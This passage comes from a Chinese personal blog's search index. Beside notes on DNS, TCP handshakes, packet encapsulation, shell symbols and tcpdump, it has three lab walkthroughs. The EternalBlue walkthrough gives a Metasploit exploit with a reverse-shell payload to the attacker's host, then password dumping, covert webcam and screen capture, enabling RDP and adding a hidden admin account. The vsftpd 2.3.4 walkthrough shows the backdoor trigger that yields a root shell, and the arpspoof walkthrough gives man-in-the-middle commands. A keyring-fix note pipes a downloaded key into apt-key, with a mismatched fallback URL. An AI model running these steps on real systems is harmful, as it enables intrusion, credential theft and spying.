导航站会把\u0026quot;快乐汉堡\u0026quot;的地址记录下来，下次别人问的时候，可以直接告诉他们。\n","date":"2025-04-22T22:45:35+08:00","permalink":"https://souljian.cn/p/745333135/","title":"DNS协议与域名解析"},{"content":"kali 密钥环过期解决方案 出现以下告警：校验数字签名时出错\n可以尝试以下解决方法： 这些公钥通常用于验证从 APT 软件仓库下载的软件包的签名，以确保它们的完整性和来源的可信度。 当你运行 apt -key list 命令时，它会显示一个或多个公钥的列表，每个公钥都包含以下信息：\n公钥 ID ：一个唯一的标识符，用于区分不同的公钥。\n创建日期 ：公钥生成的日期。\n过期日期 ：公钥不再被信任的日期（如果适用）。\n用户 ID (UID) ：与公钥相关联的用户或实体的标识信息，通常包括名称和电子邮件地址。\n指纹 ：公钥的完整哈希值，用于唯一标识公钥并验证其真实性。 发现 /etc/apt/trusted.gpg.d/kali -archive -keyring.gpg 密钥环过期 apt-key list ======= 列出系统中所有已信任的 GPG 公钥 备份原密钥环 执行以下命令重新导入秘钥环 有效期更新 wget -O - https://archive.kali.org/archive-key.asc |apt-key add\n如果在执行以上指令时出现错误提示，则可以更换成以下指令重新执行\nwget -O - https://dl.google.com/linux/linux_signing_key.pub | apt-key add - reboot apt-key list apt update ：更新本地软件包索引的命令\napt upgrade ：更新已安装软件包的命令\nsudo apt update \u0026amp;\u0026amp; sudo apt upgrade ======= 更新安装软件包\n","date":"2025-04-22T13:47:28+08:00","permalink":"https://souljian.cn/p/745300848/","title":"Kali 密钥环过期解决方案"},{"content":"目录 TCP协议简介 三次握手过程 四次挥手过程 技术细节解析 实际应用场景 安全性考虑 TCP协议简介 TCP（传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。它具有以下特点：\n• 面向连接：通信前需要建立连接（三次握手），通信结束后需要断开连接（四次挥手） • 可靠传输：使用确认机制和重传机制确保数据不丢失 • 流量控制：通过滑动窗口机制控制发送速率 • 拥塞控制：避免网络拥塞，动态调整传输速率\n📦 三次握手过程——例子：快递员确认收货地址 假设你的浏览器（Chrome）是寄件人，服务器（Apache）是收件人，TCP协议（运输层）是快递公司，三次握手就像快递员上门确认地址的过程：\n1. 第一次握手（浏览器→服务器） • 动作： • 浏览器发送一个SYN=1的包裹（SYN是同步序列号请求），并生成随机序号seq=1000 • 快递员（TCP）说：\u0026ldquo;您好，我是快递员，Chrome想给Apache寄包裹，您能收吗？\u0026rdquo; • 状态变化： • 客户端状态：CLOSED → SYN_SENT • 服务端状态：LISTEN\n2. 第二次握手（服务器→浏览器） • 动作： • 服务器收到SYN后，回复SYN=1 + ACK=1，序号seq=2000，确认号ack=1001 • 快递员反馈：\u0026ldquo;Apache确认能收件，请把包裹按编号1001开始发给我！\u0026rdquo; • 状态变化： • 服务端状态：LISTEN → SYN_RECEIVED • 技术点： • ACK=1表示确认收到第一次握手 • ack=1001表示\u0026quot;我期待收到下一个编号是1001的数据\u0026quot; • 确认号计算规则：收到的序号+1\n3. 第三次握手（浏览器→服务器） • 动作： • 浏览器发送ACK=1，序号seq=1001，确认号ack=2001 • 快递员说：\u0026ldquo;好的，我会按您的要求开始寄送！\u0026rdquo; • 状态变化： • 客户端状态：SYN_SENT → ESTABLISHED • 服务端状态：SYN_RECEIVED → ESTABLISHED\n💡 为什么必须三次？ • 防止历史连接干扰：如果第一次握手的包裹卡在路由器（N1/N2）后又重复发送，服务器能通过第三次握手判断是否为过期请求 • 确保双方同步：通过三次握手，双方都能确认对方的发送和接收能力 • 避免资源浪费：防止已失效的连接请求报文突然又传送到服务端，造成错误\n✋ 四次挥手过程——例子：快递员确认包裹已全部送达 当数据传输完毕，TCP需要安全断开连接，就像快递员要确认双方都没有包裹需要寄送了：\n1. 第一次挥手（浏览器→服务器） • 动作： • 浏览器发送FIN=1（FIN是结束标志），序号seq=5000 • 快递员说：\u0026ldquo;Chrome的包裹都寄完了，准备收工啦！\u0026rdquo; • 状态变化： • 客户端状态：ESTABLISHED → FIN_WAIT_1\n2. 第二次挥手（服务器→浏览器） • 动作： • 服务器回复ACK=1，确认号ack=5001 • 快递员反馈：\u0026ldquo;好的，我收到你的收工通知了，但等我确认Apache还有没有包裹要寄给你\u0026rdquo; • 状态变化： • 服务端状态：ESTABLISHED → CLOSE_WAIT • 客户端状态：FIN_WAIT_1 → FIN_WAIT_2\n3. 第三次挥手（服务器→浏览器） • 动作： • 服务器发送FIN=1，序号seq=8000 • 快递员说：\u0026ldquo;Apache这边也没有包裹要寄了，可以收工！\u0026rdquo; • 状态变化： • 服务端状态：CLOSE_WAIT → LAST_ACK\n4. 第四次挥手（浏览器→服务器） • 动作： • 浏览器回复ACK=1，确认号ack=8001 • 快递员确认：\u0026ldquo;双方都确认完毕，连接正式关闭！\u0026rdquo; • 状态变化： • 客户端状态：FIN_WAIT_2 → TIME_WAIT → CLOSED • 服务端状态：LAST_ACK → CLOSED\n💡 为什么挥手要四次？ • 双向关闭原则：TCP是全双工通信，每个方向都需要单独关闭 • 第一次挥手：客户端关闭发送通道 • 第二次挥手：服务端确认客户端的关闭请求 • 第三次挥手：服务端关闭发送通道 • 第四次挥手：客户端确认服务端的关闭请求 • 数据完整性保证：确保双方的数据都能完整传输，不会因为一方提前关闭而丢失数据\n🔧 技术细节解析 TCP标志位说明 • SYN（同步序列号）：用于建立连接时同步序列号 • ACK（确认标志）：表示确认号字段有效 • FIN（结束标志）：用于释放连接 • RST（重置连接）：用于异常终止连接 • PSH（推送标志）：接收方应尽快将这个报文段交给应用层 • URG（紧急标志）：表示紧急指针字段有效\n序列号与确认号 • 序列号（seq）： • 用于标识从TCP源端向目的端发送的字节流 • 初始序列号（ISN）是随机生成的 • 确认号（ack）： • 期望收到对方下一个报文段的第一个数据字节的序号 • 计算方式：收到的序列号 + 1\n🌐 实际应用场景 1. 网页浏览 • 场景描述： • 打开网页时自动完成三次握手 • 数据传输过程中保持连接 • 关闭标签页时触发四次挥手 • 注意事项： • 现代浏览器通常使用HTTP长连接（Keep-Alive） • 一个TCP连接可以复用于多个HTTP请求\n2. 文件下载 • 特点： • 建立连接后持续传输大量数据 • 支持断点续传（基于序列号机制） • 优化建议： • 适当增大TCP窗口大小 • 启用TCP快速重传机制\n3. 实时通信 • 应用场景： • 即时通讯 • 在线游戏 • 视频会议 • 性能考虑： • 需要低延迟 • 可能需要配置TCP_NODELAY选项\n🛡️ 安全性考虑 1. SYN洪泛攻击 • 攻击原理： • 攻击者发送大量SYN请求但不完成三次握手 • 服务器为每个请求分配资源，最终耗尽资源 • 防护措施： • 启用SYN Cookie • 增大半连接队列 • 设置合理的超时时间\n2. TCP重置攻击 • 攻击原理： • 攻击者伪造RST包中断正常连接 • 防护措施： • 启用TCP MD5认证 • 使用IPSec保护TCP连接\n3. 连接耗尽攻击 • 攻击原理： • 建立大量TCP连接但不释放 • 防护措施： • 限制单IP的最大连接数 • 启用连接超时机制\n🔍 常见问题与解决方案 1. 连接建立失败 • 可能原因： • 网络不通 • 服务端端口未开放 • 防火墙拦截 • 解决方案： • 检查网络连通性 • 确认服务状态 • 检查防火墙规则\n2. 连接无法释放 • 可能原因： • TIME_WAIT状态积累 • 程序未正确关闭连接 • 解决方案： • 调整TCP参数（tcp_tw_reuse） • 优化程序代码，确保正确关闭连接\n3. 性能问题 • 表现： • 连接建立慢 • 数据传输延迟大 • 优化方案： • 使用TCP Fast Open • 调整TCP缓冲区大小 • 优化网络路由\n📚 延伸阅读 TCP状态转换 TCP流量控制 TCP拥塞控制 TCP keepalive机制 TCP安全加固最佳实践 ","date":"2025-04-21T21:54:23+08:00","permalink":"https://souljian.cn/p/745243663/","title":"TCP三次握手和四次挥手"},{"content":"好的！我们结合原图用 「拆快递」 的比喻来解释解包过程，帮你把封包/解包的全流程对应到图中的每一层结构：\n📦 解包过程详解（对照原图的五层结构） 假设服务器收到你从Chrome发来的数据包（封包过程见前文），现在需要从物理层到应用层逐层解包：\n1. 物理层 → 数据链路层（撕外层包装） • 动作： • 服务器网卡收到光信号/电信号 • 将信号转换为二进制数据流（011010...） • 对应： •物理层接收信号，传递给右侧数据链路层\n2. 数据链路层（拆卡车运输箱） • 动作： • 检查数据帧的MAC地址（类似核对卡车车牌号） • 剥离MAC头部，发现目的地是当前服务器 • 如果MAC地址匹配，把数据包交给 网络层 ；不匹配则丢弃 • 对应： • 据链路层剥离封装 → 网络层 开始工作\n3. 网络层（拆地址分拣标签） • 动作： • 检查IP头部，确认目的IP是10.20.1.100（服务器自身IP） • 剥离IP头部，查看传输层协议类型（如TCP/UDP） • 如果IP不匹配且服务器是路由器，会重新转发（类似快递中转站） • 对应： •网络层剥离IP封装 → 运输层处理\n4. 运输层（拆快递小包裹） • 动作： • TCP协议检查端口号（比如目的端口80对应Apache服务） • 检查数据包顺序号和校验和，若丢包则要求重发（类似快递员打电话让你补发丢失的箱子） • 重组被拆分的多个小包裹，恢复完整数据流 • 对应： • 右侧运输层重组数据 → 应用层准备接收\n5. 应用层（拆最终包裹） • 动作： • Apache服务器解析HTTP请求内容（比如\u0026quot;请给我首页HTML\u0026quot;） • 生成响应数据（网页内容），开始反向封包过程（把包裹寄回浏览器） • 对应图示： • 右侧应用层的Apache进程处理请求，完成解包\n🔄 封包 vs 解包关键对比 过程 方向 典型动作 图示对应关系 封包 从应用层→物理层 逐层添加头部（如IP头、TCP头） 左側Chrome各层向下封装 解包 从物理层→应用层 逐层剥离头部并校验 右側Apache各层向上解封装 💡 解包过程中的核心技术 MAC地址过滤（数据链路层）： • 类似快递驿站只接收本小区快递，服务器会丢弃MAC地址不匹配的数据包 IP地址验证（网络层）： • 服务器确认数据包是\u0026quot;寄给自己\u0026quot;的，否则执行转发或丢弃 端口号映射（运输层）： • 通过目的端口80，将数据交给Apache进程（类似快递员按门牌号送货） 数据重组（运输层）： • 如果收到顺序错乱的包裹（如先收到编号3/3，再收到1/3），TCP会重新排序 应用协议解析（应用层）： • Apache根据HTTP协议解析请求内容，理解用户想要什么网页 🌐 结合原图的完整流程 封包（Chrome→N1→N2→Apache） ： • 左側橙色（应用层）→蓝色→绿色→青色→深绿色，经N1/N2路由器传递 解包（Apache←N2←N1←Chrome） ： • 右側深绿色（物理层）←青色←绿色←蓝色←橙色，逆向剥离每层封装 🛠️ 为什么分层解包重要？ • 错误隔离：如果物理层信号干扰（深绿色层），只需重传这一层数据，不影响上层 • 高效处理：网络层（绿色）快速判断IP地址，无需解析全部数据 • 灵活扩展：新增加密协议只需修改应用层（橙色），其他层保持不变\n下次看到网络分层图时，可以想象数据包像俄罗斯套娃，每一层都包裹着更核心的数据！ 🪆\n","date":"2025-04-21T21:52:46+08:00","permalink":"https://souljian.cn/p/745243566/","title":"数据包解包过程"},{"content":"我们以 10网段私有IP地址 为例（比如你家/公司内网），重新还原整个过程，重点标注源IP和目的IP：\n📦 快递运输过程（10网段IP版） 假设你的电脑IP是 10.0.0.2，要访问公司内网的服务器IP 10.20.1.100，流程如下：\n1. 应用层（对话） • 你的浏览器（Chrome） • 源IP：10.0.0.2（你的电脑） • 目的IP：10.20.1.100（公司服务器） • 请求内容：\u0026ldquo;请给我首页HTML文件\u0026rdquo;（写在快递单上的文字）\n2. 运输层（拆包+贴标签） • TCP协议处理 • 源端口：随机生成（比如54321，你的浏览器门牌号） • 目的端口：80（默认HTTP服务的门牌号） • 动作：把\u0026quot;首页请求\u0026quot;拆成多个小包裹，每个包裹标注顺序号（类似快递箱编号1/3、2/3、3/3）\n3. 网络层（找路） • 路由器N1（你的网关） • 源IP：10.0.0.2 • 目的IP：10.20.1.100 • 查路由表：\u0026ldquo;去往10.20.0.0/16网段，下一跳是路由器N2（IP 10.0.0.1）\u0026rdquo; • 类似快递分拣员：\u0026ldquo;这个包裹是10.20网段的，走3号通道到N2！\u0026rdquo;\n4. 数据链路层（卡车运输） • 从电脑到路由器N1 • 源MAC地址：AA:BB:CC:DD:EE:01（你的电脑网卡） • 目的MAC地址：AA:BB:CC:DD:EE:02（路由器N1的接口） • 动作：通过网线/WiFi传输（卡车运输）\n5. 物理层（信号传输） • 网线中的电信号或WiFi的无线电波，把二进制数据流（01101000...）从电脑传到路由器N1。\n🌐 完整路径（含IP） 1 你的电脑 (10.0.0.2) → 路由器N1 → 路由器N2 → 公司服务器 (10.20.1.100) 应用层：浏览器发起请求 → 服务器返回网页 运输层：TCP通过端口（源端口）54321→80（目标端口）保证数据顺序 网络层：IP地址（源IP）10.0.0.2→10.20.1.100（目标IP）指引方向 数据链路层：MAC地址逐段接力传输（每经过一个路由器，源/目的MAC都会改变） 物理层：网线/WiFi承载光/电信号 💡 关键点 IP地址的作用： • 类似快递收件地址，网络层靠IP地址决定包裹往哪送 • 10.x.x.x是私有IP（类似公司内部房间号），仅在局域网内使用 MAC地址的作用： • 类似卡车车牌号，数据链路层靠MAC地址完成\u0026quot;最后一公里\u0026quot;配送 • 每经过一个路由器（N1→N2），MAC地址都会更新，但IP地址始终不变 为什么用10网段？ • 私有IP地址（10.0.0.0~10.255.255.255）专用于内网 • 避免和公网IP冲突，适合企业/家庭内部通信 ","date":"2025-04-21T21:52:15+08:00","permalink":"https://souljian.cn/p/745243535/","title":"数据包封装过程"},{"content":" 一、特殊字符说明 （一）#：注释字符 功能：以 # 开头的内容被视为注释，不会被执行。\n示例：\n1 2 3 4 # This line is a comment. this_string=\u0026#34;amazing alvin\u0026#34; echo awesome ${this_string#amazing} # 输出去掉 \u0026#34;amazing\u0026#34; 的字符串 echo $this_string # 输出原始字符串 用途：用于在脚本中添加说明或临时禁用某些命令。\n（二）~：代表用户的 home 目录 功能：~ 表示当前用户的家目录。\n示例：\n1 2 cd ~ # 返回当前用户的家目录 cd ~/Documents # 进入家目录下的 Documents 文件夹 用途：快速定位到用户的家目录或其子目录。\n（三）;：分号（连续指令） 功能：分隔多个命令，即使前面的命令失败，后面的命令也会继续执行。\n示例：\n1 ls \u0026gt; count.txt; wc -l count.txt; rm count.txt 用途：在一行中执行多个命令。\n（四）/：路径分隔符 功能：用于分隔路径中的目录和文件名，/ 也表示根目录。\n示例：\n1 cd /usr/local/bin 用途：表示路径或切换到根目录。\n（五）\\：转义符 功能：\n取消特殊字符的功能。 连接多行命令。 示例：\n1 2 \\rm file.txt # 取消 rm 的别名 echo \u0026#34;Backup dir, \\$bkdir = $bkdir\u0026#34; # 输出 $bkdir 而非变量内容 用途：用于转义特殊字符或分割长命令。\n（六）|：管道符 功能：将一个命令的输出作为下一个命令的输入。\n示例：\n1 who | wc -l # 统计当前登录用户数量 用途：连接多个命令，实现复杂的数据处理。\n（七）.：当前目录 功能：表示当前目录。\n示例：\n1 ./script.sh # 执行当前目录下的 script.sh 脚本 用途：指定当前目录下的文件或脚本。\n（八）..：父目录 功能：表示当前目录的上一级目录。\n示例：\n1 cd .. # 返回上一级目录 用途：快速切换到父目录。\n（九）?：单字符通配符 功能：匹配文件名中的任意单个字符。\n示例：\n1 ls f?.txt # 匹配 f0.txt、f1.txt 等 用途：用于文件名匹配。\n（十）*：多字符通配符 功能：匹配任意长度的字符序列。\n示例：\n1 ls f*.txt # 匹配以 f 开头的所有 .txt 文件 用途：用于文件名匹配。\n（十一）!：逻辑非 功能：表示逻辑非，用于条件表达式中。\n示例：\n1 ls f[!1-9].txt # 匹配除了 f1.txt 到 f9.txt 之外的文件 用途：用于条件判断或文件名匹配。\n二、补充特殊字符 （十二）` ","date":"2025-04-21T21:24:02+08:00","permalink":"https://souljian.cn/p/745241842/","title":"Linux中特殊符号含义"},{"content":" （一）什么是永恒之蓝？ 定义：永恒之蓝（Eternal Blue）是一种利用 Windows 系统 SMB 协议漏洞（通常使用 139、445 端口）的攻击方式，攻击者通过该漏洞可获取系统最高权限，进而控制被入侵计算机。\n影响范围：\n2017 年 5 月 12 日，不法分子改造\u0026quot;永恒之蓝\u0026quot;制作了 WannaCry 勒索病毒，导致全球范围内大量机构（包括学校、大型企业和政府机构）遭受攻击。 被攻击设备被锁定，要求支付 300 美元比特币赎金，否则删除文件。 攻击通过扫描开放 445 端口的 Windows 机器，无需用户操作，开机上网即可被植入勒索软件、远程控制木马等恶意程序。 受影响国家包括乌克兰、俄罗斯、西班牙、法国、英国等，重要基础设施（政府、银行、电力系统等）均被波及。 （二）受影响的系统版本 桌面操作系统：\nWindows XP Windows Vista Windows 7 Windows 8 Windows 8.1 Windows 10 服务器操作系统：\nWindows Server 2000 Windows Server 2003 Windows Server 2008 Windows Server 2012 Windows Server 2016 备注：是否受影响取决于是否安装了对应的补丁。\n二、永恒之蓝攻击步骤 （一）内网扫描存活机器 命令：\n1 nmap -sS -p 445 192.168.110.0/24 \u0026gt; p_445 解释：\n使用 nmap 工具进行半开放扫描（-sS），扫描指定网段（192.168.110.0/24）内开放 445 端口的主机。 扫描结果保存到文件 p_445 中。 目的：找出内网中可能存在的目标主机。\n（二）确定攻击目标 操作：筛选出开放 445 端口的存活机器，确定攻击目标。 （三）测试目标连通性 命令：\n1 ping [目标IP] 解释：通过 ping 命令测试目标主机的网络连通性，确保目标主机可达。\n（四）打开 Kali 数据库 命令：\n1 2 3 service postgresql status service postgresql start service postgresql status 解释：\n查看 PostgreSQL 数据库服务的状态。 如果未开启，则启动数据库服务。 再次确认数据库服务已成功启动。 （五）数据库初始化 命令：\n1 msfdb init 解释：初始化 Metasploit 框架的数据库，为后续攻击做准备。\n（六）启动 msf 工具 命令：\n1 msfconsole 解释：启动 Metasploit 框架的控制台。\n（七）搜索永恒之蓝漏洞 命令：\n1 search ms17_010 解释：在 Metasploit 框架中搜索与 MS17-010 漏洞相关的模块。\n（八）选择扫描模块 命令：\n1 2 use auxiliary/scanner/smb/smb_ms17_010 use exploit/windows/smb/ms17_010_eternalblue 解释：\nauxiliary/scanner/smb/smb_ms17_010：用于扫描目标主机是否存在 MS17-010 漏洞（Proof of Concept，PoC 扫描）。 exploit/windows/smb/ms17_010_eternalblue：用于实际利用 MS17-010 漏洞的攻击模块。 （九）设置扫描基本配置 命令：\n1 2 3 set rhost [目标IP] set payload windows/x64/meterpreter/reverse_tcp set lhost [攻击机IP] 解释：\nrhost：设置目标主机的 IP 地址。 payload：设置攻击载荷，这里使用的是 windows/x64/meterpreter/reverse_tcp，即 64 位 Windows 系统的 Meterpreter 反向 TCP 连接。 lhost：设置攻击机的 IP 地址，用于接收目标主机的 Meterpreter 连接。 （十）开始攻击 命令：\n1 2 run exploit 解释：执行攻击，利用 MS17-010 漏洞入侵目标主机。\n（十一）攻击生效 操作：攻击成功后，可进行以下操作：\n文件上传下载 获取截屏 获取密码 开启摄像头 后门持久化等 三、漏洞利用 （一）截屏 命令：\n1 screenshot 解释：通过 Meterpreter 的 screenshot 命令获取目标主机的屏幕截图，截图保存在攻击机的 /home/mz/ 目录下。\n（二）获取账号密码 命令：\n1 2 3 4 5 hashdump load kiwi ps -S \u0026#34;csrss\u0026#34; migrate [进程号] creds_all 解释：\nhashdump：获取目标主机的用户名及加密密码。 load kiwi：加载 Kiwi 模块，用于获取更详细的凭证信息。 ps -S \u0026quot;csrss\u0026quot;：搜索 csrss.exe 进程，获取其进程号。 migrate [进程号]：将 Meterpreter 迁移到指定进程，获取更高的权限（如 SYSTEM 权限）。 creds_all：获取目标主机的所有凭证信息，包括解析加密密码。 （三）实时监控 命令：\n1 2 run vnc screenshare 解释：\nrun vnc：启动 VNC 服务，用于远程桌面监控。 screenshare：共享屏幕，实时查看目标主机的屏幕操作。 （四）开启摄像头 命令：\n1 webcam_stream 解释：通过 Meterpreter 的 webcam_stream 命令开启目标主机的摄像头，实时监控。\n四、后渗透阶段 （一）Shell 连接目标机器 命令：\n1 shell 解释：通过 Meterpreter 的 shell 命令获取目标主机的命令行交互界面。\n（二）消除乱码 命令：\n1 chcp 65001 解释：在目标主机上设置字符编码为 UTF-8，避免乱码问题。\n（三）开启目标远程桌面服务 命令：\n1 wmic RDTOGGLE WHERE ServerName=\u0026#39;%COMPUTERNAME%\u0026#39; call SetAllowTSConnections 1 解释：通过 Windows Management Instrumentation Command-line（WMIC）工具开启目标主机的远程桌面服务（默认端口 3389）。\n（四）查看端口开启状态 命令：\n1 netstat -an 解释：查看目标主机的网络连接状态，确认远程桌面服务端口（3389）是否已开启。\n（五）远程桌面连接 命令：\n1 rdesktop [目标IP] 解释：使用 rdesktop 工具连接目标主机的远程桌面服务。\n（六）登录账号密码 操作：\n如果目标主机已有账号密码，直接使用。\n如果没有，可通过以下命令新建用户并提升为管理员：\n创建用户：\n1 net user hack 123456 /add 提升为管理员：\n1 net localgroup administrators hack /add 图形化建议 你可以根据上述内容绘制以下流程图：\n攻击流程图：\n内网扫描存活机器 → 确定攻击目标 → 测试目标连通性 → 打开 Kali 数据库 → 数据库初始化 → 启动 msf 工具 → 搜索漏洞 → 选择扫描模块 → 设置扫描配置 → 开始攻击 → 攻击生效。 漏洞利用流程图：\n截屏 → 获取账号密码 → 实时监控 → 开启摄像头。 后渗透阶段流程图：\nShell 连接目标机器 → 消除乱码 → 开启远程桌面服务 → 查看端口状态 → 远程桌面连接 → 登录账号密码。 ","date":"2025-04-21T21:20:47+08:00","permalink":"https://souljian.cn/p/745241647/","title":"永恒之蓝漏洞复现"},{"content":"好的，我将在笔记中补充 -v、-vv 和 -vvv 的具体作用，并完善相关内容。\nTCPdump 命令笔记 一、简介 TCPdump 是一款强大的网络抓包工具，用于捕获和分析网络流量。它能够实时捕获网络中的数据包，并根据指定的过滤条件进行筛选和分析，是网络管理员和开发人员排查网络问题、分析网络性能的利器。\n二、基本语法 1 tcpdump [选项] [过滤条件] 三、常用选项 3.1 捕获设置 -i \u0026lt;interface\u0026gt;：指定监听的网络接口，例如eth0、wlan0或any（捕获所有接口的数据包）。 1 tcpdump -i eth0 -c \u0026lt;count\u0026gt;：捕获指定数量的数据包后停止。 1 tcpdump -i eth0 -c 100 -s \u0026lt;size\u0026gt;：设置捕获数据包的大小，默认为65535字节。 1 tcpdump -i eth0 -s 0 3.2 输出设置 -n：不解析主机名和端口名，直接显示IP地址和端口号。 1 tcpdump -i eth0 -n -nn：不解析主机名、端口名和协议名。 1 tcpdump -i eth0 -nn -X：以十六进制和ASCII格式显示数据包内容。 1 tcpdump -i eth0 -X -v、-vv、-vvv：增加输出的详细程度。 -v：显示更多详细信息，例如协议的详细字段。 -vv：显示更详细的协议信息，包括一些扩展字段。 -vvv：显示最详细的信息，包括数据包的完整内容和协议的详细解析。 1 2 3 tcpdump -i eth0 -v tcpdump -i eth0 -vv tcpdump -i eth0 -vvv 3.3 文件操作 -w \u0026lt;file\u0026gt;：将捕获的数据包保存到指定文件中。 1 tcpdump -i eth0 -w output.pcap -r \u0026lt;file\u0026gt;：从指定文件中读取数据包。 1 tcpdump -r output.pcap 四、过滤条件 TCPdump 支持丰富的过滤条件，用于筛选特定类型的数据包。\n4.1 基于协议过滤 指定协议类型，如tcp、udp、icmp等。 1 2 3 tcpdump -i eth0 tcp tcpdump -i eth0 udp tcpdump -i eth0 icmp 4.2 基于主机过滤 指定特定主机的IP地址。 1 tcpdump -i eth0 host 192.168.1.1 指定源主机或目标主机。 1 2 tcpdump -i eth0 src 192.168.1.1 tcpdump -i eth0 dst 192.168.1.1 4.3 基于端口过滤 指定特定端口号。 1 tcpdump -i eth0 port 80 指定源端口或目标端口。 1 2 tcpdump -i eth0 src port 80 tcpdump -i eth0 dst port 80 4.4 复合条件 使用逻辑运算符and、or、not组合多个条件。 1 2 tcpdump -i eth0 tcp and host 192.168.1.1 tcpdump -i eth0 tcp and port 80 or port 443 五、高级用法 5.1 捕获特定网络段 指定网络段，例如捕获192.168.1.0/24网段的数据包。 1 tcpdump -i eth0 net 192.168.1.0/24 5.2 捕获特定方向的数据包 指定数据包的传输方向。 1 2 tcpdump -i eth0 inbound tcpdump -i eth0 outbound 5.3 使用表达式过滤 使用复杂的表达式进行过滤，例如捕获特定协议和端口的组合。 1 tcpdump -i eth0 \u0026#39;tcp port 80 and (tcp[((tcp[12:1] \u0026amp; 0xf0) \u0026gt;\u0026gt; 2):4] = 0x47455420)\u0026#39; 5.4 实时分析与输出控制 使用 -l 参数可以让 tcpdump 的输出立即发送到管道命令，适用于实时分析。 1 tcpdump -i eth0 -l port 80 | grep \u0026#39;Server:\u0026#39; 六、实战案例 6.1 捕获特定主机的HTTP流量 1 tcpdump -i eth0 -n -X tcp port 80 and host 192.168.1.1 -n：不解析主机名。 -X：以十六进制和ASCII格式显示内容。 tcp port 80：筛选TCP协议的80端口（HTTP）。 host 192.168.1.1：指定主机IP。 6.2 分析网络延迟 1 tcpdump -i eth0 -tttt -c 100 -tttt：显示时间戳，精确到秒。 -c 100：捕获100个数据包。 通过观察时间戳，可以分析网络延迟情况。 6.3 捕获并保存数据包 1 tcpdump -i eth0 -w capture.pcap 将捕获的数据包保存到capture.pcap文件中，后续可以使用Wireshark等工具进行详细分析。 七、注意事项 权限问题：TCPdump 需要管理员权限才能运行。 性能影响：在高流量的网络环境中，TCPdump 可能会对系统性能产生一定影响。 隐私问题：捕获的数据包可能包含敏感信息，请确保合法使用。 ","date":"2025-04-21T21:18:27+08:00","permalink":"https://souljian.cn/p/745241507/","title":"Tcpdump命令使用"},{"content":"实验笔记：vsftpd 2.3.4 笑脸漏洞复现\n实验目标 复现 vsftpd 2.3.4 的\u0026quot;笑脸漏洞\u0026quot;，通过该漏洞获取靶机的 root 权限。\n实验环境 攻击机：Kali Linux 靶机：Metasploitable Linux 2.0.0 实验步骤 一、环境搭建 下载并启动靶机\n下载 Metasploitable Linux 2.0.0 镜像文件。 解压后使用 VMware 打开并启动虚拟机。 登录靶机并修改 root 密码\n使用普通用户 msfadmin 登录，密码为 msfadmin。\n修改 root 用户的密码：\n1 msfadmin@metasploitable:~$ sudo passwd root 按提示输入新密码。\n二、漏洞复现 端口扫描\n在 Kali Linux 上打开终端，使用 nmap 扫描靶机的开放端口：\n1 nmap 192.168.xx.xx （将 192.168.xx.xx 替换为靶机的实际 IP 地址）\n确认靶机开放了 21 (FTP) 端口。\n扫描 FTP 服务版本\n使用 nmap 扫描 FTP 服务的版本信息：\n1 nmap -sV 192.168.xx.xx 确认靶机运行的是 vsftpd 2.3.4 版本。\n触发漏洞\n在 Kali Linux 上使用 Netcat (nc) 连接靶机的 21 端口：\n1 nc 192.168.xx.xx 21 输入以下命令（注意手动输入）：\n1 2 user mz:) pass aaaaa 此时靶机的 6200 端口会自动开启。保持当前终端状态，不要关闭。\n验证 6200 端口\n在 Kali Linux 上另起一个终端，使用 nmap 扫描 6200 端口：\n1 sudo nmap -sS -p 6200 192.168.xx.xx 确认 6200 端口已开启。\n获取 root 权限\n使用 Netcat 连接靶机的 6200 端口：\n1 nc 192.168.xx.xx 6200 成功连接后，即可以 root 身份登录靶机。\n注意：连接后执行ls查看是都已经进去半终端\n确认进入半终端可执行python -c \u0026lsquo;import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo; 调用完整终端\n三、实验注意事项 如果在实验过程中遇到问题，可以尝试重启靶机。 确保在触发漏洞后保持 Netcat 连接状态，否则 6200 端口可能会关闭。 实验总结： 本次实验通过 vsftpd 2.3.4 的\u0026quot;笑脸漏洞\u0026quot;，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。\n","date":"2025-04-21T12:59:27+08:00","permalink":"https://souljian.cn/p/745211567/","title":"FTP笑脸漏洞复现"},{"content":"一、简介 arpspoof 是一款用于 ARP 欺骗的工具，能够发送伪造的 ARP 数据包，欺骗网络中的设备，使其将攻击者的设备误认为是目标设备。这通常用于中间人攻击（MITM），例如捕获网络流量或篡改数据。\n二、安装 （一）Kali Linux arpspoof 在 Kali Linux 中通常已经预装。如果没有安装，可以通过安装 dsniff 包来获取：\n1 2 sudo apt-get update sudo apt-get install dsniff （二）Ubuntu 在 Ubuntu 上，arpspoof 也包含在 dsniff 包中：\n1 2 sudo apt-get update sudo apt-get install dsniff （三）CentOS 在 CentOS 上，可以通过安装 dsniff 包来获取 arpspoof：\n1 2 sudo yum install epel-release sudo yum install dsniff 安装完成后，可以通过以下命令验证 arpspoof 是否安装成功：\n1 arpspoof --help 三、基本语法 1 arpspoof [选项] [目标 IP] 四、常用选项 选项 说明 -i \u0026lt;接口\u0026gt; 指定要使用的网络接口。 -t \u0026lt;目标 IP\u0026gt; 指定一个特殊的、将被 ARP 毒化的主机。 -r 毒化两个主机（目标和主机）以捕获两个方向的网络流量。 `-c own host 五、使用示例 （一）欺骗单个目标 1 sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 将目标主机（192.168.1.100）的 ARP 表项中的默认网关（192.168.1.1）指向攻击者的设备。\n（二）自动欺骗网关 1 sudo arpspoof -i eth0 -r 192.168.1.100 自动将目标主机（192.168.1.100）的 ARP 表项中的默认网关指向攻击者的设备。\n（三）欺骗整个网络 1 sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1 将整个网络中的设备的 ARP 表项中的默认网关指向攻击者的设备。\n（四）恢复 ARP 表项 1 sudo arpspoof -i eth0 -c both -t 192.168.1.100 192.168.1.1 恢复目标主机（192.168.1.100）的 ARP 表项，使其恢复正常。\n六、注意事项 权限问题：arpspoof 需要管理员权限才能运行。 网络环境：某些网络环境可能检测到 ARP 欺骗行为并采取措施。 法律问题：未经授权的 ARP 欺骗行为可能违反法律法规。 网络拓扑：在复杂的网络环境中，可能需要调整攻击策略以确保有效欺骗。 工具替代：如果 arpspoof 不可用，可以使用其他工具（如 ettercap 或 bettercap）来实现类似功能。 七、总结 arpspoof 是一个功能强大的 ARP 